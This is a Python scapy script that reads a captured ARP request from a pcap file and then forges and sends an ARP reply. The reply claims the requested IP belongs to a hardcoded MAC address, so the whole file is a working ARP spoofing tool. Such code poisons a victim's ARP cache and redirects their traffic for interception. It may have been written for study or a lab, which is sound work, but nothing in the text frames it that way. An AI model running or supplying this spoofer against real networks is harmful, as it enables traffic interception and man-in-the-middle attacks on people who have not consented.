#! python

from scapy.all import *
import sys

def main():
    try:
        scapy_cap = rdpcap(sys.argv[1])
    except:
        print("Please supply a .pcap file as the first argument to this program.")
        exit()

    # read ARP request packet info
    src_ip = scapy_cap[0].psrc
    dst_ip = scapy_cap[0].pdst
    src_hw = scapy_cap[0].hwsrc
    dst_hw = scapy_cap[0].hwdst

    print("\n")
    print("Source IP:           ", src_ip)
    print("Requested IP:        ", dst_ip)
    print("Source Hardware:     ", src_hw)
    print("Destination Hardware:", dst_hw)

    # build up the ARP response packet
    arp_response = Ether()/ARP()
    arp_response.dst = src_hw
    arp_response.src = "00:0c:29:c5:33:72"
    arp_response.hwlen = 6
    arp_response.plen = 4
    arp_response.op = 2
    arp_response.hwsrc = "00:0c:29:c5:33:72"
    arp_response.psrc = dst_ip
    arp_response.hwdst = src_hw
    arp_response.pdst = src_ip

    src_mac = arp_response.hwsrc
    dst_mac = arp_response.hwdst
    op_code = arp_response.op

    print("\n")
    print("Source MAC:     ", src_mac)
    print("Destination MAC:", dst_mac)
    print("ARP Op Code:    ", op_code)
    print()

    # send packet
    sendp(arp_response)
    print()

if __name__ == "__main__":
    main()
